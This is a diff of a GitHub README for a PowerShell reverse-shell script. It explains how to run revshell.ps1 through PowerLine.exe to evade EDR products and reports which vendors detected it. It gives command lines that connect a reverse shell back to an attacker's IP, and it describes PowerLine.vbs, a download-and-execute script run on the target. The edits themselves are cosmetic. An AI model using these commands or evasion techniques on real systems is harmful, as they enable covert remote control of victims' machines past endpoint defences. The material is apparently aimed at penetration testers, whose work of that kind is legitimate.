@@ -117,16 +117,18 @@ You will notice that I used the windows/x64/shell_reverse_tcp payload for the mu
 ![ubuntu](https://github.com/rtaylor777/ps_cmd_rev_shell/blob/master/netcat_revshell_caught.jpg)
 
 ## revshell.ps1
-While testing on EDR (Endpoint Detection and Response) solutions, I decided to configure the script to accept the hostip and port as parameters as well as to start in the PowerShell mode. The activity of launching CMD windows to run commands from within PowerShell was suspicious. In the 3 EDR solutions that I tested, the script was detected when run by PowerShell.exe. But when run by a tool called PowerLine (https://github.com/fullmetalcache/PowerLine) it was only detected on CrowdStrike (https://www.crowdstrike.com/).
+While testing on EDR (Endpoint Detection and Response) solutions, I decided to configure the script to accept the hostip and port as parameters as well as to start in the PowerShell mode. The activity of launching CMD windows to run commands from within PowerShell was suspicious. In the 3 EDR solutions that I tested, the script was detected when run by PowerShell.exe. But when run by a tool called PowerLine (https://github.com/fullmetalcache/PowerLine) it was only detected on CrowdStrike (https://www.crowdstrike.com/) (true as of 2019-10-31 your mileage may vary).
 
 **PowerLine.exe**
 
-I would like to encourage you to build your own PowerLine.exe (rename it to whatever you need etc.). As professionals you should not trust executables like this unless you know how they were built. But for convenience I included my build in this github repo. I only included my revshell.ps1 script in the scripts that are builtin to PowerLine.exe in order to ensure that if PowerLine.exe was detected it was not because of someone else's scripts.
+I would like to encourage you to build your own PowerLine.exe (rename it to whatever you need etc.). As professionals you should not trust executables like this unless you know how they were built. But for convenience I included my build in this github repo. I only included my revshell.ps1 script, in the scripts that are builtin to PowerLine.exe, in order to ensure that if PowerLine.exe was detected it was not because of someone else's scripts.
 
 You can run it like this, from a CMD prompt:
+
 PowerLine.exe reveshell "revshell -hostip <attackrs IP>"
 
 Or if you are listening on a different port than 5379:
+
 PowerLine.exe revshell "revshell -hostip <attackers IP> -port <desired port>"
 
 **PowerLine.vbs**
@@ -134,7 +136,9 @@ PowerLine.exe revshell "revshell -hostip <attackers IP> -port <desired port>"
 This is just a handy download and execute script for the PowerLine.exe. You will need to edit the script to have the correct IP address to download PowerLine.exe from and to have the correct IP address to connect back to for the reverse shell.
 
 You would want to run the PowerLine.vbs script from a CMD shell on the target like this, otherwise, if you just run it from the browser, you will get prompts about how it is an executable and how it is not signed etc..:
+
 c:\users\username\Downloads>cscript PowerLine.vbs
+
 
 ## Troubleshooting
 
